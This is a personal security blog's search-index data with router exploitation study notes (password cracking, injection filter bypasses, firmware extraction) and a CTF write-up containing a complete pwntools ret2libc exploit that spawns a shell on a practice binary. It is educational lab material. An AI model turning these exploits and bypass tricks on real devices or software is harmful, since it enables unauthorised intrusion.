[{"title":"Hello World","url":"/2025/04/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"hello shituku","url":"/2025/04/17/hello-shituku/","content":""},{"title":"loT基本知识","url":"/2025/04/19/loT%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/","content":"前置基础\nmips linux：使用mips指令架构的linux系统，广泛应用于嵌入式系统，路由器常用mips32和arm架构。\nrisc架构：精简指令集，包括mips、arm、risc-v。\nbusybox：精简终端，路由器shell多为裁剪版busybox，shell命令本质为busybox符号链接。\n\n路由的漏洞利用利用方式\n密码破解：默认密码、弱口令、字典爆破、侧信道（如服务器响应时间、返回数据包特征，爆破密码或PIN码）。\nweb漏洞：访问web管理服务与web界面交互，进行渗透（如SQL注入、RCE、CSRF、XSS）。\n后门：如缓冲区溢出、危险函数利用。\n\n密码破解\n默认密码、弱口令、字典爆破。\n侧信道攻击：利用响应时间、数据包特征爆破密码或PIN码。\n\nweb漏洞\nSQL注入、RCE、CSRF、XSS等。\n通过web管理界面进行渗透。\n\n后门\n可绕过安全控制获取访问权的漏洞。\n典型如32764端口后门等。\n\n缓冲区溢出\n危险函数：strcpy、sprintf、snprintf、strchr、gets、fgetc。\nsprintf：格式化字符串中有%s且未判断长度，可能栈溢出。\nsnprintf：返回值为输入长度，size为unsigned类型，需注意负数转大正数的溢出。\nstrchr：复制长度由?前字符串长度决定，需注意越界。\nfgetc：循环读取字符，注意循环边界。\n\n代码示例：\n// 使用snprintf安全格式化字符串，left为已写入长度// Use snprintf to safely format string, left is the length already writtenint left = snprintf(stack, sizeof(stack), &quot;%s&quot;, buf_from_http1);// 继续在stack后面追加内容，防止溢出// Continue appending to stack, prevent overflowsnprintf(stack+left, sizeof(stack)-left, &quot;%s&quot;, buf_from_http2);// 查找url中的&#x27;?&#x27;字符，获取查询参数位置// Find &#x27;?&#x27; in url to get query parameter positionchar *query = strchr(url, &#x27;?&#x27;);// 将url中&#x27;?&#x27;前的内容复制到stack，长度为query - url - 1// Copy content before &#x27;?&#x27; in url to stack, length is query - url - 1strncpy(stack, url, query - url - 1);\n\n逻辑漏洞\n多功能点组合利用，挖掘攻击链。\n\n注入类\n敏感函数：system、popen、exec、execve。\n过滤绕过：如$IFS绕过空格，xxd、base64编码。\n\n工具\nmipsAudit：mips静态汇编审计辅助脚本，回溯敏感函数审计危险函数。\n在IDA-&gt;file-&gt;Script FIle中加载，控制台输出信息并高亮显示。\n\nmips linux\nmips linux广泛用于嵌入式系统，路由器常用mips32和arm。\nmips通过a0-a3传递前4个参数，其余通过栈传递。\n叶子函数与非叶子函数的栈布局和调用方式不同。\n\nbusybox\nbusybox为精简终端，路由器shell多为其裁剪版。\n常用命令：\n\n$ busybox --help        # 查看支持命令 / Show supported commands$ uname -r              # 查看内核版本 / Show kernel version$ ls -al                # 查看详细文件列表 / List files in detail$ rm -rf /tmp           # 强制删除目录 / Force delete directory$ cp -R /tmp ./now      # 复制目录 / Copy directory$ du -sk fireware.bin   # 查看文件大小 / Show file size$ ps -ef                # 查看进程 / Show processes$ kill -9 pid           # 强制终止进程 / Force kill process$ killall -9 xxx        # 强制终止进程名 / Force kill by process name$ ifconfig -a           # 查看所有网卡信息 / Show all network interfaces\n\nHTTP协议\nCRLF：回车换行，C语言为\\r\\n，十六进制0A0D。\nURI：统一资源标识符，包括协议、主机名、端口、路径、查询字符串、片段标识符。\n\n文件系统\n路径作用：\n&#x2F;bin &#x2F;sbin &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;sbin：存放应用程序\n&#x2F;lib &#x2F;usr&#x2F;lib：存放动态库\n&#x2F;etc：存放配置文件\n\n\n\n固件修复\n拿到固件后需模拟环境，缺少硬件易导致仿真失败。\n修复流程：定位异常函数，编写同功能函数并封装为动态库，使用LD_PRELOAD劫持。\n\n路由器漏洞原理与利用路由器web漏洞\nxss、csrf、基础认证漏洞（如http://admin:admin@192.168.0.1形式免输用户名密码）。\n基础认证漏洞可与xss、csrf组合，形成攻击链。\n\n路由器后门漏洞\n可绕过安全控制的漏洞。\n典型如32764端口后门。\n\n路由器溢出漏洞\nmips32函数调用与x86不同，参数传递和栈布局需注意。\n非叶子函数可正常溢出利用，叶子函数需溢出大量数据覆盖父函数返回地址。\n\n软件层分析固件获取\n路由器固件包含操作系统内核和文件系统。\n获取途径：厂商网站、web管理界面、硬件提取、云市场。\n\n文件系统\n路由器文件系统用于存储操作系统、配置文件、日志等。\n常见压缩格式：Squashfs（GZIP, LZMA, LZO, XZ）。\n提取方法：strings、hexdump、dd、file等命令结合使用。\n自动提取工具：binwalk。\n\n代码示例：\n$ strings firmware.bin | grep `python -c &#x27;print &quot;\\x28\\xcd\\x3d\\x45&quot;&#x27;`  # 查找特征字符串 / Find signature string$ dd if=firmware.bin bs=1 count=1024 skip=256 of=out.squashfs             # 提取文件系统 / Extract filesystem$ binwalk -Me x.bin --run-as=root                                         # 自动提取 / Auto extract\n\n硬件层分析\n通过路由器硬件接口获取固件，如JTAG、Flash芯片编程器、芯片夹等。\n路由器flash为常用内存类型，断电后仍保存数据。\nbootloader（如u-boot）负责设备启动和内核加载。\nkernel为操作系统内核，root filesystem为根文件系统。\nnvram保存配置文件，启动时读取。\n\n\n"},{"title":"利用栈溢出获取 Shell：从零开始的 PWN 之旅","url":"/2025/04/20/%E5%88%A9%E7%94%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E8%8E%B7%E5%8F%96-Shell%EF%BC%9A%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-PWN-%E4%B9%8B%E6%97%85/","content":"引言在 CTF 竞赛中，PWN（漏洞利用）题目是考验选手逆向分析和漏洞利用能力的重要环节。本文将分析一道简单的 Linux 64 位 PWN 题目，通过栈溢出漏洞构造 ROP 链，最终获取 shell。这篇文章适合 PWN 初学者，旨在展示从逆向分析到利用脚本编写的完整过程。希望通过这篇文章，你能掌握栈溢出的基本原理和利用方法！\n题目背景\n文件：pwnme（64 位 ELF，可执行文件）\n环境：Ubuntu 20.04，关闭 ASLR（echo 0 | sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space）\n保护机制：无 NX、Canary、ASLR、PIE\n目标：通过栈溢出漏洞执行 system(“&#x2F;bin&#x2F;sh”)，获取 shell\n\n题目分析1. 文件检查使用 file 和 checksec 检查文件：\n$ file pwnmepwnme: ELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped$ checksec pwnme[*] &#x27;pwnme&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)\n64 位 ELF 文件，动态链接。无 Canary、NX、PIE，栈可执行，地址固定，适合初学者练习栈溢出。Partial RELRO 表示 GOT 表可写，稍后可能利用。\n2. 逆向分析使用 IDA Pro 打开 pwnme，找到 main 函数：\nint main() &#123;    char buf[32];    puts(&quot;Welcome to PWN!&quot;);    printf(&quot;Input your name: &quot;);    gets(buf);    puts(&quot;Hello, &quot;);    puts(buf);    return 0;&#125;\ngets 函数读取用户输入到 buf（大小 32 字节），无长度限制，存在明显的栈溢出漏洞。buf 位于栈上，溢出可以覆盖返回地址，控制程序流程。\n反汇编 main 函数（部分）：\n.text:0000000000401136 main:.text:0000000000401136     push    rbp.text:0000000000401137     mov     rbp, rsp.text:000000000040113A     sub     rsp, 20h.text:000000000040113E     lea     rdi, aWelcomeToPwn ; &quot;Welcome to PWN!&quot;.text:0000000000401145     call    puts.text:000000000040114A     lea     rdi, aInputYourName ; &quot;Input your name: &quot;.text:0000000000401151     call    printf.text:0000000000401156     lea     rax, [rbp-20h].text:000000000040115A     mov     rdi, rax.text:000000000040115D     call    gets....text:0000000000401172     leave.text:0000000000401173     ret\nbuf 位于 [rbp-0x20]，大小 32 字节。溢出可以覆盖 rbp 和返回地址（[rbp+0x8]）。\n3. 漏洞点gets 不检查输入长度，输入超过 32 字节即可覆盖栈上的返回地址。由于 NX 禁用，栈可执行，可以直接写入 shellcode；但为了练习 ROP，我们选择构造 ROP 链调用 system(“&#x2F;bin&#x2F;sh”)。\n利用思路1. 目标通过栈溢出覆盖返回地址，构造 ROP 链调用 system(“&#x2F;bin&#x2F;sh”)，获取 shell。\n2. 关键步骤\n泄露 libc 地址：\nmain 函数调用 puts 和 printf，可以通过 GOT 表泄露 puts 的实际地址，计算 libc 基址。\n使用 ROP 调用 puts(puts@got) 输出 puts 地址。\n\n\n构造 ROP 链：\n找到 pop rdi; ret gadget，将 &#x2F;bin&#x2F;sh 字符串地址放入 rdi。\n调用 system(“&#x2F;bin&#x2F;sh”) 执行 shell。\n\n\n栈布局：\n覆盖返回地址后，栈需要填充 gadget 和参数。\n\n\n\n3. 内存布局栈溢出的内存布局如下：\n[ buf (32 bytes) ][ saved rbp (8 bytes) ][ saved ret (8 bytes) ]                   ^                    ^                   rbp                 rbp+0x8 (覆盖这里)\n输入 32 字节填充 buf，8 字节填充 saved rbp，第 41 字节开始覆盖返回地址。\n利用脚本以下是使用 pwntools 编写的利用脚本：\nfrom pwn import *# 设置环境context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)binary = &#x27;./pwnme&#x27;elf = context.binary = ELF(binary)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)  # 根据环境调整# 启动进程p = process(binary)# 第一次调用：泄露 puts 地址pop_rdi = 0x4011bb  # pop rdi; retprintf_plt = elf.plt[&#x27;printf&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]payload = b&#x27;A&#x27; * 40  # 32 bytes buf + 8 bytes saved rbppayload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)p.sendline(payload)p.recvuntil(b&#x27;Hello, \\n&#x27;)# 接收 puts 地址并计算 libc 基址puts_addr = u64(p.recvline().strip().ljust(8, b&#x27;\\x00&#x27;))libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))log.info(f&#x27;puts_addr: &#123;hex(puts_addr)&#125;&#x27;)log.info(f&#x27;libc_base: &#123;hex(libc_base)&#125;&#x27;)log.info(f&#x27;system_addr: &#123;hex(system_addr)&#125;&#x27;)log.info(f&#x27;binsh_addr: &#123;hex(binsh_addr)&#125;&#x27;)# 第二次调用：执行 system(&quot;/bin/sh&quot;)payload = b&#x27;A&#x27; * 40payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)p.sendline(payload)p.recvuntil(b&#x27;Hello, \\n&#x27;)# 进入交互模式p.interactive()\n\n脚本说明\n第一次 payload：\n填充 40 字节覆盖到返回地址。\n调用 puts(puts@got) 泄露 puts 地址。\n返回 main 函数，允许第二次输入。\n\n\n计算 libc 地址：\n从输出中提取 puts 地址，减去 libc 中 puts 的偏移，得到 libc 基址。\n计算 system 和 &#x2F;bin&#x2F;sh 字符串的地址。\n\n\n第二次 payload：\n使用 pop rdi; ret gadget 将 &#x2F;bin&#x2F;sh 地址放入 rdi。\n调用 system 执行 shell。\n\n\n\n运行结果运行脚本后，成功获取 shell：\n$ python3 exploit.py[+] Starting local process &#x27;./pwnme&#x27;: pid 12345[*] puts_addr: 0x7f1234567890[*] libc_base: 0x7f1234500000[*] system_addr: 0x7f1234543210[*] binsh_addr: 0x7f12346789ab[*] Switching to interactive mode$ whoamiuser$ cat flagFLAG&#123;stack_overflow_is_fun&#125;\n成功获取 shell，并读取 Flag。\n调试过程中的“坑”在调试时遇到以下问题：\n\nlibc 版本不匹配：本地 libc 和题目环境的 libc 版本不同，导致偏移错误。解决方法是使用题目提供的 libc 文件或 Docker 环境。\nASLR 未关闭：本地测试时忘记关闭 ASLR，导致地址随机化。使用 echo 0 | sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space 解决。\npayload 长度错误：最初填充长度错误，覆盖了无关区域。使用 gdb 调试确认 buf 到返回地址的偏移为 40 字节。\n\n总结与反思通过这道题目，我学习了以下关键点：\n\n栈溢出原理：通过覆盖返回地址控制程序流程。\nROP 链构造：使用 gadget（如 pop rdi; ret）传递函数参数。\nlibc 地址泄露：利用 GOT 表和 PLT 调用输出动态链接函数的地址。\n\n改进思路\n如果题目启用了 NX，可以尝试 ret2libc 或更复杂的 ROP 链。\n可以优化脚本，使用 pwntools 的 ROP 模块自动构造链。\n未来可以尝试分析带 Canary 或 ASLR 的题目，学习更高级的绕过技术。\n\n"}]